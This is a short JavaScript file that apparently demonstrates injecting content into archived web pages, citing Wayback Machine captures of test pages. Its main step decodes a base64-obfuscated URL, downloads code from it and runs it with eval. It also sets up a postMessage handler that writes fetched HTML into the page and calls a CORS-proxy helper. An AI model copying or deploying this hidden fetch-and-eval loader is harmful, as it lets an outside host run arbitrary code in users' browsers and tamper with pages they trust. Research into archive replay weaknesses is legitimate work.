import 'babel-polyfill'
import axios from 'axios'
import nurls from './notUrls'
import Purl from './purl'
import doCorsMe from './doCorsMe'
import cleanUpRandyHTML from './cleanUpRandyHTML'

const helpers = {
  purl: null
}
const getMeThis = {
  type: 'fetch',
  id: 'nums',
  what: nurls.randyNumbers.join('')
}

// http://web.archive.org/web/20170518223727/http://www.cs.odu.edu/~jberlin/funTimes/
// http://web.archive.org/web/20170519033130/http://www.cs.odu.edu/~jberlin/funtimes2/
// http://web.archive.org/web/20170519034938/http://www.cs.odu.edu/~jberlin/funtimes2/ almost better
// http://web.archive.org/web/20170519034938/http://www.cs.odu.edu/~jberlin/funtimes2/ gotcha
// http://web.archive.org/web/20170519051421/http://www.cs.odu.edu/~jberlin/funtimes2/ gotcha even more

function messageHandler (e) {
  if (e.data) {
    switch (e.data.type) {
      case 'alvie':
        e.source.postMessage(getMeThis, e.origin)
        helpers.purl = new Purl(e.data.location, 'hostNotif')
        break
      case 'fetched':
        if (e.data.id === 'nums') {
          let num = document.getElementById('randyNums')
          num.innerHTML = cleanUpRandyHTML(e.data.data, nurls.randyNumsAppend)
          doCorsMe('coresMeURL', 'coresMeImDiv', helpers.purl, true)
            .then(() => doCorsMe('coresMeUR2L', 'coresMeImDiv2', helpers.purl))
            .then(() => {
              console.log('done cors me')
            })
            .catch(error => {
              console.error(error)
            })
        }
        break
      default:
        break
    }
  }
}
window.addEventListener('message', messageHandler, false)
axios.get(atob(nurls.evalInjected))
  .then(ret => {
    // console.log(ret)
    eval(ret.data)
  })
  .catch(error => {
    console.error(error)
  })


/*
 fetch('https://crossorigin.me/http://lorempixel.com/400/200/nightlife/',{method: 'GET', headers: new Headers({'Origin': location.origin})}).then(ret => ret.blob())
 .then((ret) => {
 console.log(ret)
 }).catch(error => {
 console.error(error)
 })
 */
